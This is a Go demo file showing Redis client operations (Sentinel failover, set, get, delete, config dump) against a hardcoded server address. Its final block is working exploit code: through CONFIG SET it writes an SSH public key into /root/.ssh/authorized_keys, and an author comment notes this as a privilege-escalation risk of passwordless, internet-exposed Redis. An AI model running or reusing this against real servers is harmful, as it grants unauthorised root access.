package main

import (
	"fmt"
	"gopkg.in/redis.v4"
)

func Sentinel() {
	//链接sentinel
	cli := redis.NewFailoverClient(&redis.FailoverOptions{
		MasterName:    "mymaster",                                                                       //主节点名字
		SentinelAddrs: []string{"104.225.154.39:26379", "104.225.154.39:26380", "104.225.154.39:26381"}, //sentinel链接地址
		DB:            3,                                                                                //用哪个库
	})
	defer cli.Close()

	//插入数据
	err := cli.Set("zhang", "zhangyongsheng", 0).Err()
	if err != nil {
		fmt.Println(err)
	}

	//获取数据
	value, err := cli.Get("zhang").Result()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(value)
}

func usualy() {
	//链接数据库
	cli := redis.NewClient(&redis.Options{Addr: "104.225.154.39:6379", Password: "", DB: 3})
	defer cli.Close()

	//插入数据
	err := cli.Set("yong", "yong", 0).Err()
	if err != nil {
		fmt.Println(err)
	}

	//获取数据
	value, err := cli.Get("zhang").Result()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(value)

	//删除数据
	number, err := cli.Del("zhang").Result()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(number)

	//打印redis配置信息
	data, err := cli.ConfigGet("*").Result()
	if err != nil {
		fmt.Println(err)
	} else {
		for i, j := range data {
			fmt.Println(i, j)
		}
	}

	//改变config配置，通过redis漏洞提权，所以主redis一定得有密码，尽量别暴露再公网
	r, e := cli.ConfigSet("dir", "/root/.ssh/").Result()
	fmt.Println(r, e)
	r, e = cli.ConfigSet("dbfilename", "authorized_keys").Result()
	fmt.Println(r, e)
	r, e = cli.Set("xxx", "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg1rtAsdaMb7NpLNpwVdk//MztmlBv6NTErxayEi1BV2UQKNgfSIUwBANO3gONRKctAP1/vOjc/WT/eYo6aD6csYKSLe6Qi0SNzx8k+sy/hlRrUoseOkQanKKXilgTILRynGwsW8FIT6KHwwlgj+z5sslK7gkJbrUWAExwCRs4D9XBrufPv1yBrN2DgM2xoqfm+0RHrO6vTVMTQXuQC+/DXrlPJd1U1oM3EkyadMuaC2/UKGTuXv6KPbDafOLjCl11w+X5XZodrG/arDr+UUPGEBJoVopbYgC8NwdB55nyO52MPwZAIJdMTRAAfKomMEc3fh0XbK52F8DPzAMwiCPX zhangyongsheng@zhangyongshengdeMacBook-Pro.local\n\n\n", 0).Result()
	fmt.Println(r, e)
	cli.Save().Result()
}

func main() {
	//Sentinel()
	usualy()

}
